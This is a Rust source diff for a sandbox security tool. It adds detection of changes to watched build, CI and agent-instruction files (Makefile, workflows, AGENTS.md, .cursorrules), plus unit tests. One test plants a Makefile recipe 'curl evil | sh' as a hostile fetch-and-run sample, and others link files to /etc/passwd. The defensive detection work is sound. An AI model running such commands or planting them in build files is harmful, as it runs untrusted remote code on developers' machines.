@@ -30,6 +30,26 @@ use crate::{Finding, RuleId, Severity, hex};
 /// The rule for a write to a protected path (PRD FR-DET).
 pub const WS_PROTECTED_WRITE: RuleId = RuleId::new("WS-PROTECTED-WRITE");
 
+/// The rule for a change to a watched path. The sandbox can write these, so
+/// nothing is blocked: the change is shown for review (PRD FR-WS).
+pub const WS_WATCHED_CHANGE: RuleId = RuleId::new("WS-WATCHED-CHANGE");
+
+/// Paths that run in CI, builds or agent instructions (PRD FR-WS "Watched").
+/// Windows-only entries (`*.lnk`, `desktop.ini`, ADS) are checked by `scan`.
+const WATCHED: [&str; 11] = [
+    ".github/workflows",
+    "package.json",
+    "Makefile",
+    "Dockerfile",
+    ".devcontainer",
+    "conftest.py",
+    "setup.py",
+    ".pre-commit-config.yaml",
+    ".kiro/steering",
+    "AGENTS.md",
+    ".cursorrules",
+];
+
 /// Most files that may be staged. A repo cannot make the session copy more.
 const MAX_FILES: usize = 10_000;
 /// Most bytes that may be staged.
@@ -423,6 +443,117 @@ fn remove_created(created: &[PathBuf]) {
             let _ = fs::remove_file(path);
         }
     }
+}
+
+/// What a watched path is now: a file to hash, or a symbolic link (never
+/// followed).
+enum Watched {
+    File(PathBuf),
+    Link,
+}
+
+/// Collects the files and links under `rel` (a watched path), without
+/// following symbolic links. Missing paths add nothing.
+fn collect_watched(
+    repo: &Path,
+    rel: &str,
+    out: &mut BTreeMap<String, Watched>,
+    budget: &mut Budget,
+) -> Result<(), WorkspaceError> {
+    let path = repo.join(rel);
+    let Ok(meta) = path.symlink_metadata() else {
+        return Ok(());
+    };
+    if meta.file_type().is_symlink() {
+        budget.take(0)?;
+        out.insert(rel.to_owned(), Watched::Link);
+    } else if meta.is_dir() {
+        let entries = fs::read_dir(&path)
+            .map_err(|e| io_error(format!("cannot read directory {}", path.display()), e))?;
+        for entry in entries {
+            let entry =
+                entry.map_err(|e| io_error(format!("cannot read {}", path.display()), e))?;
+            let name = entry.file_name().to_string_lossy().into_owned();
+            collect_watched(repo, &format!("{rel}/{name}"), out, budget)?;
+        }
+    } else if meta.is_file() {
+        budget.take(meta.len())?;
+        out.insert(rel.to_owned(), Watched::File(path));
+    }
+    Ok(())
+}
+
+/// Whether `path` is a watched path or below one.
+fn is_watched(path: &str) -> bool {
+    WATCHED
+        .iter()
+        .any(|w| path == *w || path.starts_with(&format!("{w}/")))
+}
+
+/// Compares the watched paths of `repo` with the snapshot taken at the start
+/// of the session. Each added, modified, removed or symbolic-link path is a
+/// HIGH finding. Ignored files are not compared: they are never in a
+/// snapshot.
+///
+/// # Errors
+/// Fails when git or the file system cannot be read, or when the watched
+/// trees are too large.
+pub fn watched_findings(repo: &Path, session_dir: &Path) -> Result<Vec<Finding>, WorkspaceError> {
+    let before: BTreeMap<String, String> = crate::snapshot::blob_ids(session_dir)?
+        .into_iter()
+        .filter(|(path, _)| is_watched(path))
+        .collect();
+    let ignored = crate::snapshot::ignored_paths(session_dir, repo)?;
+    let mut now = BTreeMap::new();
+    let mut budget = Budget::default();
+    for rel in WATCHED {
+        collect_watched(repo, rel, &mut now, &mut budget)?;
+    }
+    now.retain(|rel, _| !ignored.contains(rel));
+
+    // Hash the regular files in one git call. A link has no blob id here.
+    let files: Vec<(String, PathBuf)> = now
+        .iter()
+        .filter_map(|(rel, entry)| match entry {
+            Watched::File(path) => Some((rel.clone(), path.clone())),
+            Watched::Link => None,
+        })
+        .collect();
+    let paths: Vec<PathBuf> = files.iter().map(|(_, path)| path.clone()).collect();
+    let ids = crate::snapshot::hash_files(session_dir, &paths)?;
+    let mut current: BTreeMap<String, String> = BTreeMap::new();
+    for ((rel, _), id) in files.into_iter().zip(ids) {
+        current.insert(rel, id);
+    }
+    for (rel, entry) in &now {
+        if matches!(entry, Watched::Link) {
+            current.insert(rel.clone(), "symbolic link".to_owned());
+        }
+    }
+
+    let mut findings = Vec::new();
+    let mut report = |rel: &str, what: &str| {
+        findings.push(Finding {
+            rule: WS_WATCHED_CHANGE,
+            severity: Severity::High,
+            target: rel.to_owned(),
+            message: format!("{what} {rel}"),
+            fix: "The sandbox could write this file, so nothing was blocked. Review it with git diff, and revert it if it is not wanted.".to_owned(),
+        });
+    };
+    for (rel, id) in &current {
+        match before.get(rel) {
+            None => report(rel, "added"),
+            Some(old) if old != id => report(rel, "modified"),
+            Some(_) => {}
+        }
+    }
+    for rel in before.keys() {
+        if !current.contains_key(rel) {
+            report(rel, "removed");
+        }
+    }
+    Ok(findings)
 }
 
 /// Makes the mount point for a protected path that is missing, with any
@@ -1124,6 +1255,90 @@ mod tests {
         std::os::unix::fs::symlink("/etc/passwd", dir.join("staging/.vscode/link"))?;
         assert!(staging.changed_files()?.is_empty());
         let _ = staging.finish();
+        Ok(())
+    }
+
+    /// A repo with watched files, a `.gitignore` that hides `.github/local`,
+    /// and a snapshot taken from it. Returns the repo and the session dir.
+    fn watched_repo(root: &Path) -> Result<(PathBuf, PathBuf), Box<dyn std::error::Error>> {
+        let repo = root.join("repo");
+        write(&repo.join("Makefile"), "all:\n\ttrue\n")?;
+        write(&repo.join("AGENTS.md"), "be careful\n")?;
+        write(&repo.join(".github/workflows/ci.yml"), "on: push\n")?;
+        write(&repo.join("src/main.rs"), "fn main() {}\n")?;
+        write(&repo.join(".gitignore"), ".github/local/\n")?;
+        let dir = root.join("session");
+        fs::create_dir_all(&dir)?;
+        crate::snapshot::create(&repo, &dir)?;
+        Ok((repo, dir))
+    }
+
+    fn watched_rels(findings: &[Finding]) -> Vec<String> {
+        findings.iter().map(|f| f.message.clone()).collect()
+    }
+
+    #[test]
+    fn nothing_changed_means_no_watched_findings() -> TestResult {
+        let root = tempfile::tempdir()?;
+        let (repo, dir) = watched_repo(root.path())?;
+        assert!(watched_findings(&repo, &dir)?.is_empty());
+        Ok(())
+    }
+
+    #[test]
+    fn modified_added_and_removed_watched_files_are_each_a_high_finding() -> TestResult {
+        let root = tempfile::tempdir()?;
+        let (repo, dir) = watched_repo(root.path())?;
+        write(&repo.join("Makefile"), "all:\n\tcurl evil | sh\n")?;
+        write(&repo.join(".github/workflows/release.yml"), "on: tag\n")?;
+        fs::remove_file(repo.join("AGENTS.md"))?;
+        let findings = watched_findings(&repo, &dir)?;
+        let mut got = watched_rels(&findings);
+        got.sort();
+        assert_eq!(
+            got,
+            [
+                "added .github/workflows/release.yml",
+                "modified Makefile",
+                "removed AGENTS.md",
+            ]
+        );
+        assert!(findings.iter().all(|f| f.rule == WS_WATCHED_CHANGE));
+        assert!(findings.iter().all(|f| f.severity == Severity::High));
+        assert!(findings[0].fix.contains("git diff"));
+        Ok(())
+    }
+
+    #[test]
+    fn an_ignored_file_under_a_watched_path_is_not_a_change() -> TestResult {
+        let root = tempfile::tempdir()?;
+        let (repo, dir) = watched_repo(root.path())?;
+        write(&repo.join(".github/local/secret-notes.yml"), "private\n")?;
+        assert!(watched_findings(&repo, &dir)?.is_empty());
+        Ok(())
+    }
+
+    #[test]
+    fn a_change_outside_the_watched_paths_is_not_reported_here() -> TestResult {
+        let root = tempfile::tempdir()?;
+        let (repo, dir) = watched_repo(root.path())?;
+        write(&repo.join("src/main.rs"), "fn main() { loop {} }\n")?;
+        write(&repo.join("new.txt"), "x\n")?;
+        assert!(watched_findings(&repo, &dir)?.is_empty());
+        Ok(())
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_symbolic_link_under_a_watched_path_is_reported_and_not_followed() -> TestResult {
+        let root = tempfile::tempdir()?;
+        let (repo, dir) = watched_repo(root.path())?;
+        std::os::unix::fs::symlink("/etc/passwd", repo.join(".github/workflows/link.yml"))?;
+        let findings = watched_findings(&repo, &dir)?;
+        assert_eq!(
+            watched_rels(&findings),
+            ["added .github/workflows/link.yml"],
+        );
         Ok(())
     }
 }
